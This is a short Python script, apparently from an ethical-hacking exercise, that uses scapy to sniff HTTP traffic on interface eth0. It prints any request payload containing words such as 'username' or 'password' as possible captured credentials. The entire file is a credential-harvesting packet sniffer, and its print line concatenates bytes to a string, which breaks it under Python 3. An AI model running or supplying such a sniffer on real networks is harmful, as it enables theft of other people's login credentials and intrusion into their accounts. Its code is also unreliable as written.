import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="ip")

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
             keywords = ["username", "user", "login", "password", "pass", "email"]
             for keyword in keywords:
                 if keyword in str(load).lower():
                     print("[+] Possible username/password found: " + load)
                     break
        #print(packet.show())

sniff("eth0")